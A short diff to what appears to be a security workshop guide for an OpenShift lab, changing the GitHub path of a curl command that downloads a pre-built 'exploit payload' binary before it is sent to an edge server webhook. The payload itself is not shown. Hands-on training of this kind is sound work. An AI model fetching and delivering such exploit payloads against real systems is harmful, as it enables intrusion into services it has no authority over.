@@ -74,7 +74,7 @@ Now let's grab the route URLs for the application, and download the pre-built ex
 ```bash
 export EDGE_URL=$(oc --namespace $NAMESPACE get route edge-server --output jsonpath='{.spec.host}')
 export SOCKETIO_URL=$(oc --namespace $NAMESPACE get route socketio-server --output jsonpath='{.spec.host}')
-curl -sSfL https://github.com/finhennessy/workshops/raw/refs/heads/main/workshop/files/payload.bin -o /tmp/payload.bin
+curl -sSfL https://github.com/finhennessy/workshops/raw/refs/heads/main/data/workshop/setup/payload.bin -o /tmp/payload.bin
 ```
 
 Now deliver the exploit payload to the edge server webhook:
